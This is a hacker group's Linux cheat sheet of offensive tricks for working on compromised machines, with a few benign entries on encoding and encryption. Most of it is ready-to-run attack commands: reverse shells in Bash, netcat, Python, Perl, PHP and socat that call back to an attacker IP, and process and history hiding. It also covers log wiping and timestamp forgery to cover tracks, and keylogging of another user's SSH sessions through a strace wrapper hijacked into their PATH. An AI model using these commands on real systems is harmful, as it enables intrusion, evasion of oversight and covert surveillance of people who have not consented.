# THC's favourite Tips, Tricks & Hacks (Cheat Sheet)

## Available at [https://tiny.cc/thctricks](https://tiny.cc/thctricks)

A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.

We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.

Got tricks? Send them to root@thc.org or submit a pull request.

1. [Bash](#lbwh-anchor)
   1. [Leave Bash without history](#lbwh-anchor)
   1. [Hide your command](#hyc-anchor)
   1. [Hide your arguments](#hya-anchor)
2. [SSH](#ais-anchor)
   1. [Almost invisible SSH](#ais-anchor)
   1. [SSH tunnel OUT](#sto-anchor)
   1. [SSH tunnel IN](#sti-anchor)
   1. [SSH socks5 IN](#ssi-anchor)
3. [Network](#network-anchor)
   1. [ARP discover computers on the local network](#adln-anchor)
   1. [Monitor all new TCP connections](#mtc-anchor)
   1. [Alert on all new TCP connections](#atc-anchor)
4. [File Encoding and Transfer](#fe-anchor)
   1. [uuencode](#feu-anchor)
   1. [openssl](#feo-anchor)
   1. [xxd](#fex-anchor)
   1. [Multiple binaries](#feb-anchor)
   1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
   1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
5. [Reverse Shell / Dumb Shell](#rs-anchor)
   1. [Reverse Shells](#rs-anchor)
      1. [with Bash](#rswb-anchor)
      1. [without Bash](#rswob-anchor)
      1. [with Python](#rswpy-anchor)
      1. [with Perl](#rswpl-anchor)
      1. [with PHP](#rswphp-anchor)
   1. [Upgrading the dumb shell](#rsu-anchor)
      1. [Upgrade a reverse shell to a pty shell](#rsup-anchor)
      1. [Upgrade a reverse shell to a fully interactive shell](#rsup2-anchor)
      1. [Reverse shell with socat (fully interactive)](#rssc-anchor)
 6. [Shell Hacks](#sh-anchor)
    1. [Shred files (secure delete)](#shsf-anchor)
    1. [Shred files without *shred*](#shsfwo-anchor)
    1. [Restore the date of a file](#shrdf-anchor)
    1. [Clean logfile](#shcl-anchor)
    1. [Hide files from a User without root priviledges](#shhu-anchor)
 7. [Crypto](#cr-anchor)
    1. [Generate quick random Password](#crgrp-anchor)
    1. [Linux transportable encrypted filesystems](#crltefs-anchor)
 8. [Miscellaneous](#misc-anchor)
    1. [Sniff a user's SSH session](#sss-anchor)
    1. [Sniff a user's SSH session without root priviledges](#ssswor-anchor)
    
   

---
<a id="lbwh-anchor"></a>
**1.i. Leave Bash without history:**

Tell Bash that there is no history file (*~/.bash_history*). This is the first command we execute on every shell. It will stop the Bash from logging your commands.

```
$ unset HISTFILE
```

It is good housekeeping to 'commit suicide' when exiting the shell:
```
$ kill -9 $$
```

Note: Any command starting with a " " (space) will [not get logged to history](https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces) either.
```
$  id
```
<a id="hyc-anchor"></a>
**1.ii. Hide your command**

```
$ exec -a syslogd nmap -T0 10.0.2.1/24
```

Alternative if there is no Bash:
```
$ cp `which nmap` syslogd
$ PATH=.:$PATH syslogd -T0 10.0.2.1/24
```
In this example we execute *nmap* but let it appear with the name *syslogd* in *ps alxwww* process list.

<a id="hya-anchor"></a>
**1.iii. Hide your arguments**

Continuing from above..FIXME: can this be done witout LD_PRELOAD and just in Bash?

---
<a id="ais-anchor"></a>
**2.i. Almost invisible SSH**
```
$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
```
This will not add your user to the */var/log/utmp* file and you wont show up in *w* or *who* command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to *~/.ssh/known_hosts*.

<a id="sto-anchor"></a>
**2.ii SSH tunnel OUT**

We use this all the time to circumvent local firewalls or IP filtering:
```
$ ssh -g -L31337:1.2.3.4:80 user@host.org
```
You or anyone else can now connect to your computer on port 31337 and gets connected to 1.2.3.4:80 and appearing from host 'host.org'

<a id="sti-anchor"></a>
**2.iii SSH tunnel IN**

We use this to give access to a friend to an internal machine that is not on the public Internet:
```
$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
```
Anyone connecting to host.org:31338 will get connected to the compuyter 192.168.0.5 on port 80 via your computer.

<a id="sti-anchor"></a>
**2.iv SSH sock4/5 IN**

OpenSSH 7.6 adds support for reverse dynamic forwarding. In this mode *ssh* will act as a SOCKS4/5 proxy and forward connections to the destinations requested by the remote SOCKS client.

In this example anyone configuring host.org:1080 as their SOCKS4/5 proxy can connect to any internal computers on any port that are accessible to the system where *ssh* was executed:

```
$ ssh -R 1080 user@host.org
```

---
<a id="network-anchor"></a>
<a id="adln-anchor"></a>
**3.i. ARP discover computers on the local network**
```
$ nmap -r -sn -PR 192.168.0.1/24
```
This will Arp-ping all local machines. ARP ping always seems to work and is very steahlthy (e.g. does not show up in the target's firewall). However, this command is by far our favourite:
```
$ nmap -thc
```

<a id="mtc-anchor"></a>
**3.ii. Monitor all new TCP connections**

```
# tcpdump -n "tcp[tcpflags] == tcp-syn"
```

<a id="atc-anchor"></a>
**3.iii. Alert on new TCP connections**

Make a *bing*-noise (ascii BEL) when anyone tries to SSH to/from the target system (could be an admin!).

```
# tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
```

---
<a id="fe-anchor"></a>
<a id="feu-anchor"></a>
**4.i. File Encoding - uuencode**

Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).

Encode:
```
$ uuencode /etc/issue.net issue.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```
Cut & paste the output (4 lines, starting with 'being 644 ...') into this command:
Decode:
```
$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
```

<a id="feo-anchor"></a>
**4.ii. File Encoding - openssl**

Openssl can be used when uu/decode/encode is not available on the remote system:

Encode:
```
$ openssl base64 </etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
```
Cut & paste the output into this command:
```
$ openssl base64 -d >issue.net-COPY
```

<a id="fex-anchor"></a>
**4.iii. File Encoding - xxd**

..and if neither *uuencode* nor *openssl* is available then we have to dig a bit deeper in our trick box and use *xxd*.

Encode:
```
$ xxd -p </etc/issue.net
726f6f743a783a303a30...
```

Cut & paste the output into this command:
Decode:
```
$ xxd -p -r >issue.net-COPY
```
<a id="feb-anchor"></a>
**4.iv. File Encoding - Multiple Binaries**

Method 1: Using *shar* to create a self extracting shell script with binaries inside:
```
$ shar *.png *.c >stuff.shar
```
Transfer *stuff.shar* to the remote system and execute it:
```
$ chmod 700 stuff.shar
$ ./stuff.shar
```

Method 2: Using *tar*
```
$ tar cfz - *.png *.c | openssl base64 >stuff.tgz.b64
```
Transfer *stuff.tgz.b64* to the remote system and execute:
```
$ openssl base64 -d | tar xfz -
```

<a id="ftsrl-anchor"></a>
**4.v. File transfer - using *screen* from REMOTE to LOCAL**

Transfer a file FROM the remote system to your local system:

Have a *screen* running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:

> CTRL-a : logfile screen-xfer.txt

> CTRL-a H

We use *openssl* to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and *screen* will write this data to *screen-xfer.txt*:

```
$ openssl base64 </etc/issue.net
```

Stop your local screen from logging any further data:

> CTRL-a H 

On your local computer and from a different shell decode the file:
```
$ openssl base64 -d <screen-xfer.txt
$ rm -rf screen-xfer.txt
```

<a id="ftslr-anchor"></a>
**4.vi. File transfer - using *screen* from LOCAL to REMOTE**

On your local system (from within a different shell) encode the data:
```
$ openssl base64 </etc/issue.net >screen-xfer.txt
```

On the remote system (and from within the current *screen*):
```
$ openssl base64 -d
```

Get *screen* to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:

> CTRL-a : readbuf screen-xfer.txt

> CTRL-a : paste .

> CTRL-d

> CTRL-d

Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).

---
<a id="rs-anchor"></a>
<a id="rswb-anchor"></a>
**5.i.a. Reverse shell with Bash**

Start netcat to listen on port 1524 on your system:
```
$ nc -nvlp 1524
```

On the remote system. This Bash will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:
```
$ bash -i 2>&1 >&/dev/tcp/3.13.3.7/1524 0>&1
```

<a id="rswob-anchor"></a>
**5.i.b. Reverse shell without Bash**

Especially embedded systems do not always have Bash and the */dev/tcp/* trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:

On the remote system:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | nc -vn 3.13.3.7 1524 >/tmp/.io
```

Telnet variant:
```
$ mkfifo /tmp/.io
$ sh -i 2>&1 </tmp/.io | telnet 3.13.3.7 1524 >/tmp/.io
```

<a id="rswpy-anchor"></a>
**5.i.c. Reverse shell with Python**
```
$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<a id="rswpl-anchor"></a>
**5.i.d. Reverse shell with Perl**

```
# method 1
$ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
# method 2
$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
```
<a id="rswphp-anchor"></a>
**5.i.e. Reverse shell with PHP**

```
php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i <&3 >&3 2>&3");'
```

<a id="rsu-anchor"></a>
<a id="rsup-anchor"></a>
**5.ii.a. Upgrade a reverse shell to a PTY shell**

Any of the above reverse shells are limited. For example *sudo bash* or *top* will not work. To make these work we have to upgrate the shell to a real PTY shell:

```
# Python
python -c 'import pty; pty.spawn("/bin/bash")'

# Perl
perl -e 'exec "/bin/bash";'

# Awk
awk 'BEGIN {system("/bin/bash")}'
```

<a id="rsup2-anchor"></a>
**5.ii.b. Upgrade a reverse shell to a fully interactive shell**

...and if we also like to use Ctrl-C we have to go all the way and upgrade the reverse shell to a real fully colorfull interactive shell:

```
# On the target host spwan a PTY using any of the above examples:
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
# On your terminal execute:
$ stty raw -echo

# ...and bring the connection back into the foreground:
$ fg
$ reset

# On target host
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 24 columns 80
```

<a id="rssc-anchor"></a>
**5.ii.c. Reverse shell with socat (fully interactive)**

...or install socat and get it done without much fiddling about:

```
# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
```

---
<a id="sh-anchor"></a>
<a id="shsf-anchor"></a>
**6.i. Shred & Erase a file**

```
$ shred -z foobar.txt
```

<a id="shsfwo-anchor"></a>
**6.ii. Shred & Erase without *shred***
```
$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom >"${FN}"; rm -f "${FN}"
```
Note: Or deploy your files in */dev/shm* directory so that no data is written to the harddrive. Data will be deleted on reboot.

Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.

<a id="shrdf-anchor"></a>
**6.iii. Restore the date of a file**

Let's say you have modified */etc/passwd* but the file date now shows that */etc/passwd* has been modifed. Use *touch* to change the file data to the date of another file (in this example, */etc/shadow*)

```
$ touch -r /etc/shadow /etc/passwd
```

<a id="shcl-anchor"></a>
**6.iv. Clear logfile**

This will reset the logfile to 0 without having to restart syslogd etc:
```
# cat /dev/null >/var/log/auth.log
```

This will remove any sign of us from the log file:
```
# cd /dev/shm
# grep -v 'thc\.org' /var/log/auth.log >a.log; cat a.log >/var/log/auth.log; rm -f a.log
```

<a id="shhu-anchor"></a>
**6.v. Hide files from that User withour root priviledges**

```
alias ls='ls -I SecretDirectory'
```

This will hide the directory *SecretDirectory* from the *ls* command. Place in user's *~/.profile*.

<a id="cr-anchor"></a>
<a id="crgrp-anchor"></a>
**7.i. Generate quick random Password**

Good for quick passwords without human element.

```
$ openssl rand -base64 24
```

<a id="crltefs-anchor"></a>
**7.ii. Linux transportable encrypted filesystems**

Create a 256MB large encrypted file system. You will be prompted for a password.

```
$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
$ cryptsetup luksFormat /tmp/crypted
$ mkfs.ext3 /tmp/crypted
```

Mount:

```
# losetup -f
# losetup /dev/loop0 /tmp/crypted
# cryptsetup open /dev/loop0 crypted
# mount -t ext3 /dev/mapper/crypted /mnt/crypted
```

Store data in `/mnt/crypted`, then unmount:

```
# umount /mnt/crypted
# cryptsetup close crypted
# losetup -d /dev/loop0
```

---
<a id="misc-anchor"></a>
<a id="sss-anchor"></a>
**8.i. Sniff a user's SSH session**
```
$ strace -e trace=read -p <PID> 2>&1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
```
Dirty way to monitor a user who is using *ssh* to connect to another host from a computer that you control.

<a id="ssswor-anchor"></a>
**8.ii. Sniff a user's SSH session without root priviledges**

Even dirtier way in case */proc/sys/kernel/yama/ptrace_scope* is set to 1 (strace will fail on already running SSH clients unless uid=0)

Create a wrapper script called 'ssh' that executes strace + ssh to log the session:
```
# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
$ echo '$PATH=~/.local/bin:$PATH' >>~/.profile

# Create a log directory and our own ssh binary
$ mkdir -p ~/.local/bin ~/.ssh/logs

$ cat >~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
# now press CTRL-d to close the file.

$ cat ~/.local/bin/ssh-log
#! /bin/bash
grep 'read(4' | cut -f2 -d\" | while read -r x; do
        if [ ${#x} -ne 2 ] && [ ${#x} -ne 1 ]; then continue; fi
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
                echo ""
        else
                echo -n "${x}"
        fi
done >~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
# now press CTRL-d to close the file

$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
```

The SSH session will be sniffed and logged to *~/.ssh/logs/* the next time the user logs into his shell and uses SSH.



---
Shoutz: ADM
